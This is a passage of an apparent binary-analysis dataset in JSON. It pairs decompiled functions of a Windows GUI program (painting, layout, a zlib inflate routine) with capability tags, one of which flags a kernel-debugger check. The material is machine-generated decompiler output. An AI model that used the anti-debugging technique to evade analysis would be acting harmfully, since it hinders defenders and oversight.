!= 0)) && ((*(in_EAX + 0x55) & 4) == 0)) &&\n           ((((*(iVar1 + 0x18) & 1) == 0 && (*(iVar1 + 0x10) != 0)) && (*(iVar1 + 0x14) != 0)))) {\n            fcn.00451b1c();\n        }\n    }\n    return;\n}\n",
        "token_count": 445
    },
    "00453870": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00453870(uint arg_8h, int32_t *arg_ch, uint *arg_10h, uint arg_14h)\n\n{\n    int32_t *in_EAX;\n    int32_t *in_ECX;\n    int32_t in_EDX;\n    int32_t iVar1;\n    uint var_24h;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    var_24h = *arg_10h;\n    uStack36 = arg_10h[1];\n    uStack32 = arg_10h[2];\n    uStack28 = arg_10h[3];\n    var_4h = in_EAX;\n    if ((arg_14h == 0) || (*(arg_14h + 0x493658) != *(in_EDX + 0x61))) {\n        if ((*(in_EDX + 0x175) != 0) && (*(in_EDX + 0x179) != 0)) {\n            var_8h = (**(**(in_EDX + 0x78) + 0x10))();\n            var_ch = (**(**(in_EDX + 0x78) + 0x10))();\n            var_10h = (**(**(in_EDX + 0x78) + 0x10))();\n            var_14h = (**(**(in_EDX + 0x78) + 0x10))();\n            if ((*(in_EDX + 0x61) & 4) == 0) {\n                if ((*(in_EDX + 0x61) & 1) == 0) {\n                    var_24h = *(in_EDX + 0x165);\n                    var_8h = sub.kernel32.dll_MulDiv();\n                    iVar1 = var_10h >> 1;\n                    if (iVar1 < 0) {\n                        iVar1 = iVar1 + ((var_10h & 1) != 0);\n                    }\n                    var_8h = var_8h - iVar1;\n                }\n            }\n            else if ((*(in_EDX + 0x61) & 1) == 0) {\n                var_8h = *in_ECX - (*(in_EDX + 0x175) - *(in_EDX + 0x165));\n            }\n            else {\n                var_10h = *in_ECX - (*(in_EDX + 0x175) - *(in_EDX + 0x165));\n            }\n            if ((*(in_EDX + 0x61) & 8) == 0) {\n                if ((*(in_EDX + 0x61) & 2) == 0) {\n                    var_24h = *(in_EDX + 0x169);\n                    var_ch = sub.kernel32.dll_MulDiv();\n                    iVar1 = var_14h >> 1;\n                    if (iVar1 < 0) {\n                        iVar1 = iVar1 + ((var_14h & 1) != 0);\n                    }\n                    var_ch = var_ch - iVar1;\n                }\n            }\n            else if ((*(in_EDX + 0x61) & 2) == 0) {\n                var_ch = in_ECX[1] - (*(in_EDX + 0x179) - *(in_EDX + 0x169));\n            }\n            else {\n                var_14h = in_ECX[1] - (*(in_EDX + 0x179) - *(in_EDX + 0x169));\n            }\n            if (arg_8h != '\\0') {\n                if (*0x453c48 != (*0x453c44 & *(in_EDX + 0x61))) {\n                    var_24h = *(in_EDX + 0x16d);\n                    var_8h = sub.kernel32.dll_MulDiv();\n                    iVar1 = var_10h >> 1;\n                    if (iVar1 < 0) {\n                        iVar1 = iVar1 + ((var_10h & 1) != 0);\n                    }\n                    var_8h = var_8h - iVar1;\n                }\n                if (*0x453c48 != (*0x453c4c & *(in_EDX + 0x61))) {\n                    var_24h = *(in_EDX + 0x171);\n                    var_ch = sub.kernel32.dll_MulDiv();\n                    iVar1 = var_14h >> 1;\n                    if (iVar1 < 0) {\n                        iVar1 = iVar1 + ((var_14h & 1) != 0);\n                    }\n                    var_ch = var_ch - iVar1;\n                }\n            }\n            fcn.0045dd60(1, var_14h, var_10h);\n        }\n        if (arg_14h == 0) {\n            return;\n        }\n    }\n    var_10h = arg_ch[2] - *arg_ch;\n    if (((var_10h < 0) || (arg_14h - 3 < 2)) || (arg_14h == 6)) {\n        var_10h = (**(**(in_EDX + 0x78) + 0x10))();\n    }\n    var_14h = arg_ch[3] - arg_ch[1];\n    if (((var_14h < 0) || (arg_14h - 1 < 2)) || (arg_14h == 6)) {\n        var_14h = (**(**(in_EDX + 0x78) + 0x10))();\n    }\n    var_8h = *arg_ch;\n    var_ch = arg_ch[1];\n    // switch table (7 cases) at 0x453ad3\n    switch(arg_14h) {\n    case 1:\n        arg_ch[1] = arg_ch[1] + var_14h;\n        break;\n    case 2:\n        arg_ch[3] = arg_ch[3] - var_14h;\n        var_ch = arg_ch[3];\n        break;\n    case 3:\n        *arg_ch = *arg_ch + var_10h;\n        break;\n    case 4:\n        arg_ch[2] = arg_ch[2] - var_10h;\n        var_8h = arg_ch[2];\n        break;\n    case 6:\n        var_8h = *(in_EDX + 0x40);\n        var_ch = *(in_EDX + 0x44);\n        (**(*var_4h + 0xac))(&var_24h, arg_ch, &var_14h, &var_10h, &var_ch);\n    }\n    fcn.0045dd60(1, var_14h, var_10h);\n    iVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n    if ((iVar1 != var_10h) || (iVar1 = (**(**(in_EDX + 0x78) + 0x10))(),  iVar1 != var_14h)) {\n    // switch table (6 cases) at 0x453b9b\n        switch(arg_14h) {\n        case 1:\n            iVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n            arg_ch[1] = arg_ch[1] - (var_14h - iVar1);\n            break;\n        case 2:\n            iVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n            arg_ch[3] = arg_ch[3] + (var_14h - iVar1);\n            break;\n        case 3:\n            iVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n            *arg_ch = *arg_ch - (var_10h - iVar1);\n            break;\n        case 4:\n            iVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n            arg_ch[2] = arg_ch[2] + (var_10h - iVar1);\n            break;\n        case 5:\n            iVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n            arg_ch[2] = arg_ch[2] + (var_10h - iVar1);\n            iVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n            arg_ch[3] = arg_ch[3] + (var_14h - iVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 1926
    },
    "004547a4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004547a4(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack288;\n    uint uStack284;\n    uchar *puStack280;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack280 = &stack0xfffffffc;\n    uStack284 = 0x4548c2;\n    uStack288 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack288;\n    fcn.00403af4();\n    *param_2 = in_EAX[0x19];\n    param_2[1] = 0x44000000;\n    fcn.0045473c();\n    if ((*(in_EAX + 0x14) & 1) != 0) {\n        param_2[1] = param_2[1] | 0x2000000;\n        param_2[2] = param_2[2] | 0x10000;\n    }\n    if ((*(in_EAX + 7) & 0x10) == 0) {\n        cVar1 = (**(*in_EAX + 0x50))();\n        if (cVar1 == '\\0') {\n            param_2[1] = param_2[1] | 0x8000000;\n        }\n    }\n    if (*(in_EAX + 0x76) != '\\0') {\n        param_2[1] = param_2[1] | 0x10000;\n    }\n    param_2[3] = in_EAX[0x10];\n    param_2[4] = in_EAX[0x11];\n    param_2[5] = in_EAX[0x12];\n    param_2[6] = in_EAX[0x13];\n    if (in_EAX[0xc] == 0) {\n        param_2[7] = in_EAX[0x71];\n    }\n    else {\n        iVar2 = fcn.00458594();\n        param_2[7] = iVar2;\n    }\n    param_2[9] = 0xb;\n    param_2[10] = sub.user32.dll_DefWindowProcA;\n    uVar3 = 0;\n    iVar2 = sub.user32.dll_LoadCursorA(0, 0x7f00);\n    param_2[0xf] = iVar2;\n    param_2[0x10] = 0;\n    param_2[0xd] = *0x4987f8;\n    fcn.00404530();\n    fcn.00405794();\n    fcn.0040a930();\n    *in_FS_OFFSET = uVar3;\n    uStack288 = 0x4548c9;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 653
    },
    "0045646c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045646c(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack148;\n    uint uStack144;\n    uchar *puStack140;\n    uint uStack136;\n    uint uStack132;\n    uint uVar3;\n    uint uStack112;\n    int32_t iStack108;\n    uchar *puStack104;\n    uint uStack100;\n    uint *puStack96;\n    uint var_50h;\n    int32_t nXDest;\n    int32_t nHeight;\n    int32_t var_40h;\n    int32_t var_3ch;\n    uint var_10h;\n    uint hgdiobj;\n    uint hdc;\n    int32_t *var_4h;\n    \n    if ((*(in_EAX + 0x90) != '\\0') && (*(param_2 + 4) == 0)) {\n        puStack96 = 0x4564c3;\n        cVar1 = fcn.0042fabc();\n        if (cVar1 == '\\0') {\n            puStack96 = &fcn.0045646c::var_50h;\n            uStack100 = 0x456585;\n            uStack100 = fcn.00458594();\n            puStack104 = 0x45658b;\n            uVar3 = sub.user32.dll_BeginPaint();\n            puStack104 = var_3ch - nHeight;\n            iStack108 = var_40h - nXDest;\n            uStack112 = uVar3;\n            hgdiobj = sub.gdi32.dll_CreateCompatibleBitmap();\n            *in_FS_OFFSET = &stack0xffffff84;\n            uStack132 = 0x4565b8;\n            uStack136 = sub.gdi32.dll_CreateCompatibleDC();\n            uStack132 = hgdiobj;\n            puStack140 = 0x4565c8;\n            hdc = uStack136;\n            var_10h = sub.gdi32.dll_SelectObject();\n            uStack144 = 0x456655;\n            uStack148 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff6c;\n            puStack140 = &stack0xfffffffc;\n            sub.gdi32.dll_SetWindowOrgEx(hdc, nXDest, nHeight, 0);\n            fcn.00451ae8(hdc);\n            *(param_2 + 4) = hdc;\n            fcn.0045646c();\n            *(param_2 + 4) = 0;\n            sub.gdi32.dll_BitBlt\n                      (uVar3, nXDest, nHeight, var_40h - nXDest, var_3ch - nHeight, hdc, nXDest, nHeight, 0xcc0020);\n            *in_FS_OFFSET = uVar3;\n            sub.gdi32.dll_SelectObject(hdc, var_10h, 0x45665c);\n            return;\n        }\n        puStack96 = &fcn.0045646c::var_50h;\n        uStack100 = 0x4564d7;\n        uStack100 = fcn.00458594();\n        puStack104 = 0x4564dd;\n        sub.user32.dll_BeginPaint();\n        iStack108 = 0x456572;\n        uStack112 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff90;\n        puStack104 = &stack0xfffffffc;\n        fcn.0042ee80(&fcn.0045646c::hdc, 0);\n        fcn.00451ae8(hdc);\n        uVar3 = 4;\n        uStack132 = 0x45652a;\n        fcn.00451ae8(4);\n        uStack132 = 0x456538;\n        cVar1 = fcn.004047dc();\n        if (cVar1 == '\\0') {\n            uStack132 = 0x456548;\n            fcn.0042ef78();\n        }\n        uStack132 = 0x456552;\n        fcn.0042ef0c();\n        *in_FS_OFFSET = uVar3;\n        fcn.00458594();\n        uStack132 = 0x456571;\n        sub.user32.dll_EndPaint();\n        return;\n    }\n    if ((*(in_EAX + 0x55) & 1) == 0) {\n        puStack96 = 0x45649c;\n        var_4h = in_EAX;\n        iVar2 = fcn.00454684();\n        if (iVar2 == 0) {\n            puStack96 = 0x4564aa;\n            (**(*var_4h + -0x10))();\n            return;\n        }\n    }\n    puStack96 = 0x4564b9;\n    fcn.00455cec();\n    return;\n}\n",
        "token_count": 1073
    },
    "00456990": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00456990(uint param_1, int32_t param_2)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    char cVar3;\n    int32_t *in_EAX;\n    \n    if ((*0x4569e0 == (*0x4569dc & *(in_EAX + 7))) && (iVar2 = *(param_2 + 8),  (*(iVar2 + 0x18) & 1) == 0)) {\n        cVar3 = fcn.0045252c();\n        if (cVar3 == '\\0') {\n            puVar1 = iVar2 + 0x18;\n            *puVar1 = *puVar1 | 1;\n        }\n    }\n    (**(*in_EAX + -0x10))();\n    return;\n}\n",
        "token_count": 184
    },
    "004569e4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.004569e4(void)\n\n{\n    int32_t *in_EAX;\n    \n    fcn.004588ac();\n    fcn.004533c8();\n    (**(*in_EAX + -0x10))();\n    fcn.004541c8();\n    if ((*(in_EAX + 7) & 1) == 0) {\n        fcn.0040484c();\n    }\n    return;\n}\n",
        "token_count": 96
    },
    "004575b8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.004575b8(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x1da) != '\\0') && (iVar2 = fcn.00454684(),  -1 < iVar2 + -1)) {\n        do {\n            piVar3 = fcn.00454648();\n            if (((*(piVar3 + 0x57) != '\\0') && (cVar1 = (**(*piVar3 + 0x50))(),  cVar1 != '\\0')) &&\n               ((((*(piVar3 + 0x52) & 1) != 0 && (iVar4 = fcn.00451ae8(*(*(arg_8h + -4) + 8)),  iVar4 != 0)) ||\n                ((cVar1 = fcn.004047dc(),  cVar1 != '\\0' && (cVar1 = fcn.004575b8(arg_8h),  cVar1 != '\\0')))))) {\n                return 1;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 302
    },
    "00459358": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00459358(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    \n    (**(*in_EAX + -0x10))();\n    piVar1 = *(param_2 + 8);\n    sub.user32.dll_InflateRect(piVar1, -in_EAX[0x67], -in_EAX[0x67]);\n    if (*(in_EAX + 0x195) != '\\0') {\n        iVar2 = 0;\n        if (*(in_EAX + 0x193) != '\\0') {\n            iVar2 = in_EAX[0x66];\n        }\n        if (*(in_EAX + 0x65) != '\\0') {\n            iVar2 = iVar2 + in_EAX[0x66];\n        }\n        if ((*(in_EAX + 0x192) & 1) != 0) {\n            *piVar1 = *piVar1 + iVar2;\n        }\n        if ((*(in_EAX + 0x192) & 2) != 0) {\n            piVar1[1] = piVar1[1] + iVar2;\n        }\n        if ((*(in_EAX + 0x192) & 4) != 0) {\n            piVar1[2] = piVar1[2] - iVar2;\n        }\n        if ((*(in_EAX + 0x192) & 8) != 0) {\n            piVar1[3] = piVar1[3] - iVar2;\n        }\n    }\n    return;\n}\n",
        "token_count": 364
    },
    "004593e8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004593e8(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    char cVar3;\n    int32_t *in_EAX;\n    uint uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint *in_FS_OFFSET;\n    uint uStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint uStack80;\n    uint dx;\n    uint var_38h;\n    int32_t lprcSrc1;\n    int32_t dy;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t nLeftRect;\n    int32_t nTopRect;\n    int32_t nRightRect;\n    int32_t nBottomRect;\n    uint hDC;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    var_8h = param_2;\n    var_4h = in_EAX;\n    if ((*(in_EAX + 0x195) == '\\0') && (in_EAX[0x67] == 0)) {\n        uStack80 = 0x4596ad;\n        (**(*in_EAX + -0x10))();\n        uStack80 = 0x4596b5;\n        cVar3 = fcn.00432a20();\n        if ((cVar3 != '\\0') && ((*(var_4h + 0x52) & 2) != 0)) {\n            uStack80 = 0x4596c7;\n            fcn.004321c4();\n            uStack80 = 0x4596d1;\n            fcn.00432898();\n        }\n        return;\n    }\n    uStack80 = 0x45941b;\n    uStack80 = fcn.00458594();\n    puStack84 = 0x459421;\n    hDC = sub.user32.dll_GetWindowDC();\n    uStack88 = 0x45969b;\n    uStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa4;\n    puStack84 = &stack0xfffffffc;\n    uVar4 = fcn.00458594(&fcn.004593e8::nLeftRect);\n    sub.user32.dll_GetClientRect(uVar4);\n    uVar4 = fcn.00458594(&fcn.004593e8::lprcSrc1);\n    sub.user32.dll_GetWindowRect(uVar4);\n    uVar4 = fcn.00458594(&fcn.004593e8::lprcSrc1, 2);\n    sub.user32.dll_MapWindowPoints(0, uVar4);\n    sub.user32.dll_OffsetRect(&fcn.004593e8::nLeftRect, -lprcSrc1, -dy);\n    sub.gdi32.dll_ExcludeClipRect(hDC, nLeftRect, nTopRect, nRightRect, nBottomRect);\n    iVar2 = dy;\n    iVar1 = lprcSrc1;\n    sub.user32.dll_InflateRect(&fcn.004593e8::nLeftRect, var_4h[0x67], var_4h[0x67]);\n    lprcSrc1 = nLeftRect;\n    dy = nTopRect;\n    var_24h = nRightRect;\n    var_20h = nBottomRect;\n    uVar4 = fcn.00458594(0xfffffff0);\n    uVar5 = sub.user32.dll_GetWindowLongA(uVar4);\n    if ((uVar5 & 0x200000) != 0) {\n        iVar6 = (***0x495974)(0x14);\n        var_24h = var_24h + iVar6;\n    }\n    if ((uVar5 & 0x100000) != 0) {\n        iVar6 = (***0x495974)(0x15);\n        var_20h = var_20h + iVar6;\n    }\n    if (*(var_4h + 0x195) != '\\0') {\n        iVar6 = 0;\n        if (*(var_4h + 0x193) != 0) {\n            iVar6 = var_4h[0x66];\n        }\n        if (*(var_4h + 0x65) != 0) {\n            iVar6 = iVar6 + var_4h[0x66];\n        }\n        if ((*(var_4h + 0x192) & 1) != 0) {\n            lprcSrc1 = lprcSrc1 - iVar6;\n        }\n        if ((*(var_4h + 0x192) & 2) != 0) {\n            dy = dy - iVar6;\n        }\n        if ((*(var_4h + 0x192) & 4) != 0) {\n            var_24h = var_24h + iVar6;\n        }\n        if ((*(var_4h + 0x192) & 8) != 0) {\n            var_20h = var_20h + iVar6;\n        }\n        sub.user32.dll_DrawEdge\n                  (hDC, &fcn.004593e8::lprcSrc1, \n                   *((*(var_4h + 0x193) & 0x7f) * 4 + 0x49371c) | *((*(var_4h + 0x65) & 0x7f) * 4 + 0x49372c), \n                   *(var_4h + 0x192) | *(*(var_4h + 0x195) * 4 + 0x49373c) | *(*(var_4h + 0x1d9) * 4 + 0x49374c) |\n                   0x2000);\n    }\n    sub.gdi32.dll_IntersectClipRect(hDC, lprcSrc1, dy, var_24h, var_20h);\n    if (*(var_8h + 4) == 1) {\n        sub.user32.dll_OffsetRect(&fcn.004593e8::lprcSrc1, -iVar1, -iVar2);\n    }\n    else {\n        sub.gdi32.dll_GetRgnBox(*(var_8h + 4), &fcn.004593e8::nLeftRect);\n        uVar4 = fcn.00458594(&fcn.004593e8::nLeftRect, 2);\n        sub.user32.dll_MapWindowPoints(0, uVar4);\n        sub.user32.dll_IntersectRect(&fcn.004593e8::lprcSrc1, &fcn.004593e8::lprcSrc1, &fcn.004593e8::nLeftRect);\n        sub.user32.dll_OffsetRect(&fcn.004593e8::lprcSrc1, -iVar1, -iVar2);\n    }\n    uVar7 = fcn.00424f98();\n    uVar4 = hDC;\n    sub.user32.dll_FillRect(hDC, &fcn.004593e8::lprcSrc1, uVar7);\n    *in_FS_OFFSET = uVar4;\n    uVar4 = fcn.00458594(hDC, 0x4596a2);\n    sub.user32.dll_ReleaseDC(uVar4);\n    return;\n}\n",
        "token_count": 1626
    },
    "0045979c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045979c(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint uStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(param_2 + 0xc) == 1) {\n        uStack20 = 0x459822;\n        (**(*in_EAX + -0x10))();\n    }\n    else {\n        if (((*(param_2 + 8) & 1) == 0) || (*(in_EAX + 0x57) != '\\0')) {\n            uStack20 = *(param_2 + 4);\n            puStack24 = 0x4597cc;\n            uVar1 = sub.gdi32.dll_SaveDC();\n            uStack28 = 0x459805;\n            uStack32 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffe0;\n            puStack24 = &stack0xfffffffc;\n            fcn.00455cec();\n            *in_FS_OFFSET = uStack32;\n            puStack24 = 0x459822;\n            uStack32 = *(param_2 + 4);\n            uStack28 = uVar1;\n            sub.gdi32.dll_RestoreDC();\n            return;\n        }\n        uStack20 = 0x459816;\n        (**(*in_EAX + -0x10))();\n    }\n    return;\n}\n",
        "token_count": 346
    },
    "00469b18": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.00469b18(uint param_1, int32_t param_2)\n\n{\n    uint8_t uVar1;\n    int32_t *piVar2;\n    uint8_t *puVar3;\n    uint uVar4;\n    int32_t iVar5;\n    ushort uVar6;\n    uint8_t **in_EAX;\n    uint8_t *puVar7;\n    int32_t iVar8;\n    uint8_t *puVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    uint8_t *arg_ch;\n    uint8_t *puVar14;\n    uint8_t *puStack48;\n    uint32_t uStack44;\n    uint8_t *puStack36;\n    uint8_t *puStack32;\n    uint uStack28;\n    char cStack24;\n    uint8_t uStack23;\n    int32_t iStack20;\n    \n    if ((((in_EAX == NULL) || (in_EAX[7] == NULL)) || (in_EAX[3] == NULL)) || ((*in_EAX == NULL && (in_EAX[1] != NULL)))\n       ) {\n        return -2;\n    }\n    piVar2 = in_EAX[7];\n    if (*piVar2 == 3) {\n        *piVar2 = 4;\n    }\n    puVar9 = in_EAX[3];\n    puStack48 = in_EAX[4];\n    puVar3 = in_EAX[1];\n    uStack44 = piVar2[0xd];\n    arg_ch = *in_EAX;\n    uVar13 = piVar2[0xe];\n    iStack20 = 0;\n    puVar14 = puVar3;\n    puStack36 = puStack48;\n    do {\n    // switch table (21 cases) at 0x469bb7\n        switch(*piVar2) {\n        case 0:\n            if (piVar2[2] == 0) {\n                *piVar2 = 4;\n            }\n            else {\n                for (; uVar13 < 0x10; uVar13 = uVar13 + 8) {\n                    if (puVar14 == NULL) goto code_r0x0046a8be;\n                    uVar1 = *arg_ch;\n                    arg_ch = arg_ch + 1;\n                    uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                    puVar14 = puVar14 + -1;\n                }\n                if (((uStack44 & 0xff) * 0x100 + (uStack44 >> 8)) % 0x1f == 0) {\n                    if ((uStack44 & 0xf) == 8) {\n                        uStack44 = uStack44 >> 4;\n                        uVar13 = uVar13 - 4;\n                        uVar12 = (uStack44 & 0xf) + 8;\n                        if (uVar12 < piVar2[8] || uVar12 == piVar2[8]) {\n                            piVar2[5] = 1 << uVar12;\n                            puVar7 = fcn.00467904();\n                            piVar2[6] = puVar7;\n                            in_EAX[0xc] = puVar7;\n                            if ((uStack44 & 0x200) == 0) {\n                                iVar8 = 3;\n                            }\n                            else {\n                                iVar8 = 1;\n                            }\n                            *piVar2 = iVar8;\n                            uVar13 = 0;\n                            uStack44 = 0;\n                        }\n                        else {\n                            in_EAX[6] = \"invalid window size\";\n                            *piVar2 = 0x12;\n                        }\n                    }\n                    else {\n                        in_EAX[6] = \"unknown compression method\";\n                        *piVar2 = 0x12;\n                    }\n                }\n                else {\n                    in_EAX[6] = \"incorrect header check\";\n                    *piVar2 = 0x12;\n                }\n            }\n            break;\n        case 1:\n            for (; uVar13 < 0x20; uVar13 = uVar13 + 8) {\n                if (puVar14 == NULL) goto code_r0x0046a8be;\n                uVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                puVar14 = puVar14 + -1;\n            }\n            puVar7 = (uStack44 >> 0x18) + (uStack44 >> 8 & 0xff00) + (uStack44 & 0xff00) * 0x100 + uStack44 * 0x1000000;\n            piVar2[6] = puVar7;\n            in_EAX[0xc] = puVar7;\n            uVar13 = 0;\n            uStack44 = 0;\n            *piVar2 = 2;\n        case 2:\n            if (piVar2[3] == 0) {\n                in_EAX[3] = puVar9;\n                in_EAX[4] = puStack48;\n                *in_EAX = arg_ch;\n                in_EAX[1] = puVar14;\n                piVar2[0xd] = uStack44;\n                piVar2[0xe] = uVar13;\n                return 2;\n            }\n            puVar7 = fcn.00467904();\n            piVar2[6] = puVar7;\n            in_EAX[0xc] = puVar7;\n            *piVar2 = 3;\ncode_r0x00469dc9:\n            if (param_2 == 5) goto code_r0x0046a8be;\ncode_r0x00469dd4:\n            if (piVar2[1] == 0) {\n                for (; uVar13 < 3; uVar13 = uVar13 + 8) {\n                    if (puVar14 == NULL) goto code_r0x0046a8be;\n                    uVar1 = *arg_ch;\n                    arg_ch = arg_ch + 1;\n                    uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                    puVar14 = puVar14 + -1;\n                }\n                piVar2[1] = uStack44 & 1;\n                uVar12 = uStack44 >> 1 & 3;\n                if (uVar12 == 0) {\n                    *piVar2 = 5;\n                }\n                else if (uVar12 == 1) {\n                    fcn.004699f4();\n                    *piVar2 = 10;\n                }\n                else if (uVar12 == 2) {\n                    *piVar2 = 7;\n                }\n                else if (uVar12 == 3) {\n                    in_EAX[6] = \"invalid block type\";\n                    *piVar2 = 0x12;\n                }\n                uStack44 = uStack44 >> 3;\n                uVar13 = uVar13 - 3;\n            }\n            else {\n                uStack44 = uStack44 >> (uVar13 & 7);\n                uVar13 = uVar13 - (uVar13 & 7);\n                *piVar2 = 0x10;\n            }\n            break;\n        case 3:\n            goto code_r0x00469dc9;\n        case 4:\n            goto code_r0x00469dd4;\n        case 5:\n            uStack44 = uStack44 >> (uVar13 & 7);\n            for (uVar13 = uVar13 - (uVar13 & 7); uVar13 < 0x20; uVar13 = uVar13 + 8) {\n                if (puVar14 == NULL) goto code_r0x0046a8be;\n                uVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                puVar14 = puVar14 + -1;\n            }\n            if ((uStack44 & 0xffff) == (uStack44 >> 0x10 ^ 0xffff)) {\n                piVar2[0xf] = uStack44 & 0xffff;\n                uVar13 = 0;\n                uStack44 = 0;\n                *piVar2 = 6;\n                goto code_r0x00469eeb;\n            }\n            in_EAX[6] = \"invalid stored block lengths\";\n            *piVar2 = 0x12;\n            break;\n        case 6:\ncode_r0x00469eeb:\n            puStack32 = piVar2[0xf];\n            if (puStack32 == NULL) {\n                *piVar2 = 3;\n            }\n            else {\n                if (puVar14 < puStack32) {\n                    puStack32 = puVar14;\n                }\n                if (puStack48 < puStack32) {\n                    puStack32 = puStack48;\n                }\n                if (puStack32 == NULL) goto code_r0x0046a8be;\n                fcn.00467658(puVar9, arg_ch, puStack32);\n                puVar14 = puVar14 + -puStack32;\n                arg_ch = arg_ch + puStack32;\n                puStack48 = puStack48 + -puStack32;\n                puVar9 = puVar9 + puStack32;\n                piVar2[0xf] = piVar2[0xf] - puStack32;\n            }\n            break;\n        case 7:\n            for (; uVar13 < 0xe; uVar13 = uVar13 + 8) {\n                if (puVar14 == NULL) goto code_r0x0046a8be;\n                uVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                puVar14 = puVar14 + -1;\n            }\n            piVar2[0x17] = (uStack44 & 0x1f) + 0x101;\n            piVar2[0x18] = (uStack44 >> 5 & 0x1f) + 1;\n            piVar2[0x16] = (uStack44 >> 10 & 0xf) + 4;\n            uStack44 = uStack44 >> 0xe;\n            uVar13 = uVar13 - 0xe;\n            if ((piVar2[0x17] < 0x11f) && (piVar2[0x18] < 0x1f)) {\n                piVar2[0x19] = 0;\n                *piVar2 = 8;\n                goto code_r0x0046a03f;\n            }\n            in_EAX[6] = \"too many length or distance symbols\";\n            *piVar2 = 0x12;\n            break;\n        case 8:\ncode_r0x0046a03f:\n            while (piVar2[0x19] < piVar2[0x16]) {\n                for (; uVar13 < 3; uVar13 = uVar13 + 8) {\n                    if (puVar14 == NULL) goto code_r0x0046a8be;\n                    uVar1 = *arg_ch;\n                    arg_ch = arg_ch + 1;\n                    uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                    puVar14 = puVar14 + -1;\n                }\n                iVar8 = piVar2[0x19];\n                piVar2[0x19] = piVar2[0x19] + 1;\n                *(piVar2 + *(iVar8 * 2 + 0x4944a4) * 2 + 0x6c) = uStack44 & 7;\n                uStack44 = uStack44 >> 3;\n                uVar13 = uVar13 - 3;\n            }\n            while (piVar2[0x19] < 0x13) {\n                iVar8 = piVar2[0x19];\n                piVar2[0x19] = piVar2[0x19] + 1;\n                *(piVar2 